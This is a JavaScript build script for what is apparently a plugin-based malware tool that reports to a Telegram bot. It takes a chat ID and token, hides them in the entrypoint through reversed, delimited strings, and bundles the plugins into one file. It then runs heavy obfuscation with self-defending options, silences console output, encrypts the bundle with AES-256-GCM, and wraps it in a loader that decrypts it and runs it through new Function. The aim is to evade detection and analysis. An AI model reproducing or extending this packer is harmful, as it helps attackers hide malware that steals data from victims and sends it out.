// @ts-check
const fs = require('fs-extra')
const path = require('path')
const esbuild = require('esbuild')
const argv = require('minimist')(process.argv.slice(2))

const crypto = require('crypto')
const JavaScriptObfuscator = require('javascript-obfuscator')

const helpMsg =
  'Usage: node builder.js --chatId=<telegram_chat_id> --token=<telegram_token> [--no-random-delays] [--disabled-plugins=<plugin1,plugin2,...>] [--debug]'
if (argv.help || argv.h) {
  console.log(helpMsg)
  process.exit(0)
}
if (argv.length < 2) {
  console.error(`Error: Pass the Telegram chat ID and token as arguments\n${helpMsg}`)
  process.exit(1)
}

const CHAT_ID = `${argv.chatId}`
const TOKEN = argv.token
const DEBUG = argv.debug
const RANDOM_DELAYS = argv['random-delays']
const DISABLED_PLUGINS = new Set((argv['disabled-plugins'] || '').split(',').filter(x => x))

/** @type {any} */
const obfuscationOptions = {
  compact: true,
  controlFlowFlattening: true,
  controlFlowFlatteningThreshold: 1,
  deadCodeInjection: true,
  deadCodeInjectionThreshold: 1,
  identifierNamesGenerator: 'hexadecimal',
  renameGlobals: true,
  // selfDefending: true,
  splitStrings: true,
  splitStringsChunkLength: 2,
  stringArray: true,
  // stringArrayEncoding: ['base64'], // makes it crash when packed with pkg
  stringArrayThreshold: 0.9,
  target: 'node',
  transformObjectKeys: true,
  ignoreImports: true,
  disableConsoleOutput: DEBUG ? false : true,
  numbersToExpressions: true,
  stringArrayCallsTransform: true,
  stringArrayRotate: true,
  stringArrayShuffle: true,
  stringArrayWrappersCount: 5,
  stringArrayWrappersChainedCalls: true,
  stringArrayWrappersParametersMaxCount: 5,
  stringArrayWrappersType: 'function',
  unicodeEscapeSequence: true
}

/**
 * Encrypts text by given key
 * @param {string} text to encrypt
 * @param {Buffer | string} masterkey
 * @returns {string} encrypted text, base64 encoded
 * @see https://gist.github.com/rigwild/a4f4cf1527bc044dbbc92f37f727484e
 */
function encrypt(text, masterkey) {
  // random initialization vector
  const iv = crypto.randomBytes(16)

  // random salt
  const salt = crypto.randomBytes(64)

  // derive encryption key: 32 byte key length
  // in assumption the masterkey is a cryptographic and NOT a password there is no need for
  // a large number of iterations. It may can replaced by HKDF
  // the value of 2145 is randomly chosen!
  const key = crypto.pbkdf2Sync(masterkey, salt, 2145, 32, 'sha512')

  // AES 256 GCM Mode
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv)

  // encrypt the given text
  const encrypted = Buffer.concat([cipher.update(text, 'utf8'), cipher.final()])

  // extract the auth tag
  const tag = cipher.getAuthTag()

  // generate output
  return Buffer.concat([salt, iv, tag, encrypted]).toString('base64')
}

/**
 * Decrypts text by given key
 * @param {string} encdata encoded input data
 * @param {Buffer | string} masterkey
 * @returns {string} decrypted (original) text
 * @see https://gist.github.com/rigwild/a4f4cf1527bc044dbbc92f37f727484e
 */
function decrypt(encdata, masterkey) {
  // base64 decoding
  const bData = Buffer.from(encdata, 'base64')

  // convert data to buffers
  const salt = bData.slice(0, 64)
  const iv = bData.slice(64, 80)
  const tag = bData.slice(80, 96)
  const text = bData.slice(96)

  // derive key using; 32 byte key length
  const key = crypto.pbkdf2Sync(masterkey, salt, 2145, 32, 'sha512')

  // AES 256 GCM Mode
  const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv)
  decipher.setAuthTag(tag)

  // encrypt the given text
  const decrypted = /** @type {any} */ (decipher).update(text, 'binary', 'utf8') + decipher.final('utf8')

  return decrypted
}

/** @returns {Promise<string[]>} */
async function walkFs(dir) {
  const dirFiles = await fs.promises.readdir(dir)
  const files = await Promise.all(
    dirFiles.map(async file => {
      const filePath = path.join(dir, file)
      const stats = await fs.promises.stat(filePath)
      if (stats.isDirectory()) return walkFs(filePath)
      else if (stats.isFile()) return filePath
    })
  )
  // @ts-ignore
  return files.reduce((all, folderContents) => all.concat(folderContents), [])
}

const obfuscatedDir = path.resolve(__dirname, 'obfuscated')
const entrypoint = path.resolve(__dirname, 'index.js')
const entrypointObf = path.resolve(obfuscatedDir, 'index.js')
const pluginsDir = path.resolve(__dirname, 'plugins')
const pluginsDirObf = path.resolve(obfuscatedDir, 'plugins')

const validPlugins = fs
  .readdirSync(pluginsDir, { withFileTypes: true })
  .filter(dir => {
    let ok = dir.isDirectory() && dir.name.endsWith('-plugin')
    if (ok && DISABLED_PLUGINS.has(dir.name)) {
      // console.log(`DISABLED PLUGIN: ${dir.name}`)
      return false
    }
    ok &&= fs.readdirSync(path.resolve(pluginsDir, dir.name)).includes('lib.js')
    return ok
  })
  .map(dir => dir.name)

;(async () => {
  await fs.rm(obfuscatedDir, { recursive: true }).catch(() => {})
  await fs.mkdir(obfuscatedDir, { recursive: true })

  let entrypointCode = await fs.readFile(entrypoint, 'utf8')

  // Replace dynamic imports with explicit imports for esbuild
  entrypointCode = entrypointCode.replace(
    /const plugins = fs[\s\S]*? \(\{\}\)\)/g,
    `const plugins = {
      ${validPlugins
        .map(pluginName => {
          return `'${pluginName}': (() => {
            console.log('  [${pluginName}]... ')
            return require('./plugins/${pluginName}/lib.js')
          })()`
        })
        .join(',\n')}
    }
    `
  )
  console.log('Replaced dynamic imports with explicit static imports')

  // Insert and weirdly hide the telegram chatId and token
  // prettier-ignore
  entrypointCode = entrypointCode.replace(
    /run\(\'.*?\', \'.*?\', .*?\)/,
    `
    let c='${`${CHAT_ID.split('').reverse().join(',')}+${TOKEN.split('').reverse().join('~')}`.split('').reverse().join('#')}';
    run(c.split('#').reverse().join('').split('+')[0].split(',').reverse().join(''),c.split('#').reverse().join('').split('+')[1].split('~').reverse().join(''),${RANDOM_DELAYS});
    `
  )

  await fs.writeFile(entrypointObf, entrypointCode, 'utf8')
  await fs.copy(path.resolve(__dirname, 'package.json'), path.resolve(obfuscatedDir, 'package.json'))
  await fs.copy(pluginsDir, pluginsDirObf)
  if (DEBUG) await fs.writeFile(entrypointObf.split('.js')[0] + '_unencrypted_debug.js', entrypointCode, 'utf8')
  console.log(`Copied entrypoint and plugins to ${obfuscatedDir}`)

  if (DISABLED_PLUGINS.size > 0) {
    console.log(`DISABLED PLUGINS: ${[...DISABLED_PLUGINS].join(', ')}`)
    DISABLED_PLUGINS.forEach(pluginName => fs.rmSync(path.resolve(pluginsDirObf, pluginName), { recursive: true }))
  }

  // Obfuscate code before bundling and encryption
  entrypointCode = JavaScriptObfuscator.obfuscate(entrypointCode, obfuscationOptions).getObfuscatedCode()
  await fs.writeFile(entrypointObf, entrypointCode, 'utf8')
  console.log(`Obfuscated entrypoint to ${entrypointObf}`)
  // Do the same for plugins
  validPlugins.forEach(pluginName => {
    const libPath = path.resolve(pluginsDirObf, pluginName, 'lib.js')
    const pluginCode = fs.readFileSync(libPath, 'utf8')
    fs.writeFileSync(
      libPath,
      JavaScriptObfuscator.obfuscate(pluginCode, obfuscationOptions).getObfuscatedCode(),
      'utf8'
    )
    console.log(`Obfuscated plugin [${pluginName}] to ${libPath}`)
  })

  // Bundle the entrypoint and all the plugins together
  entrypointCode = await esbuild
    .build({
      entryPoints: [entrypointObf],
      bundle: true,
      platform: 'node',
      write: false,
      absWorkingDir: obfuscatedDir
    })
    .then(res => res.outputFiles[0].text)
  await fs.writeFile(entrypointObf, entrypointCode, 'utf8')
  console.log('Bundled entrypoint and plugins together')

  // Encrypt bundle
  // Manual hack in the esbuild output bundle or the decryption would fail for native modules!! (fuck me)
  entrypointCode = entrypointCode.replace(
    /if \(\!opts\.module_root\) \{[\s\S]*?\}/g,
    'if (!opts.module_root) { opts.module_root = __dirname }'
  )
  // Random encryption secret key
  const secret = [...Array(50)].map(() => Math.random().toString(36)[2]).join('')
  const key = crypto.createHash('sha256').update(String(secret)).digest('base64').substr(0, 32)
  entrypointCode = `
    const crypto = require('crypto')
    ${decrypt.toString()}
    const decrypted = decrypt(\`${encrypt(entrypointCode, key)}\`, '${key}')
    new Function('require', '__dirname', '__filename', decrypted)(require, __dirname, __filename);
  `
  await fs.writeFile(entrypointObf, entrypointCode, 'utf8')
  console.log(`Encrypted bundle to ${entrypointObf}`)

  // Obfuscate loader/decryptor code
  // Do not split strings as encrypted data is very big
  entrypointCode = JavaScriptObfuscator.obfuscate(entrypointCode, {
    ...obfuscationOptions,
    selfDefending: true,
    splitStrings: false
  }).getObfuscatedCode()

  await fs.writeFile(entrypointObf, entrypointCode, 'utf8')
  console.log(`Obfuscated the decryptor to ${entrypointObf}`)

  // Copy native modules to obfuscated directory
  const nativeModules = (await walkFs(path.resolve(__dirname, 'node_modules'))).filter(file => file.endsWith('.node'))
  // TODO: Do not copy the native modules related to disabled plugins
  if (nativeModules.length > 0) {
    console.log('Copying native modules:')
    console.log(nativeModules.map(x => `  ${x}`).join('\n'))
    await Promise.all(
      nativeModules.map(async nativeModule =>
        fs.copy(nativeModule, path.resolve(obfuscatedDir, 'build', path.basename(nativeModule)))
      )
    )
  }

  // Remove all plugins from the obfuscated directory as they are now useless
  await fs.rm(pluginsDirObf, { recursive: true })

  console.log('Done! ✌️')
})().catch(err => {
  console.error(err)
  process.exit(1)
})
